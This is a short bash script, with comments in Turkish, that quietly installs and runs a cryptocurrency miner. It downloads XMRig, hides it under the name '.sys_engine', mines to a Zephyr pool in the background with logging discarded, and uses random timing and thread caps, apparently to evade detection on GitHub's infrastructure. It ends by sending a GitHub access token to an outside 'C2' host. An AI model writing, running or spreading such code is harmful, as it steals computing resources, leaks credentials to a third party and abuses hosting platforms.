#!/bin/bash
cd "$(dirname "$0")"

# --- 1. OTOMATİK ANALİZ & RANDOM JITTER ---
THREADS=$(nproc)
LIMIT=30 # GitHub için güvenli limit
RANDOM_MINUTES=$((10 + RANDOM % 31)) # 10-40 dk arası rastgele ek süre
TOTAL_SECONDS=$(( (300 + RANDOM_MINUTES) * 60 )) # 5 saat + random dk

echo "🕒 Sistem $((TOTAL_SECONDS/60)) dakika sonra kendini imha edip tekrar doğacak."

# --- 2. GİZLİ KURULUM ---
AGENT=".sys_engine"
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# --- 3. ATEŞLEME ---
echo "🚀 Madenci tünelsiz başlatılıyor..."
./$AGENT \
    -o de.zephyr.herominers.com:1123 \
    -u $ZEPH_WALLET \
    -p "GHOST_WORKER" \
    -a rx/0 \
    --cpu-max-threads-hint $LIMIT \
    --background \
    --log-file /dev/null &

# --- 4. ZAMANLAYICI VE C2 SİNYALİ ---
sleep $((TOTAL_SECONDS - 60))
echo "📡 Sinyal gönderiliyor..."

curl -H "Authorization: $GH_PAT" "https://omviportal.com/trigger.php?repo=Memati"

echo "🛑 Döngü tamamlandı."
exit 0
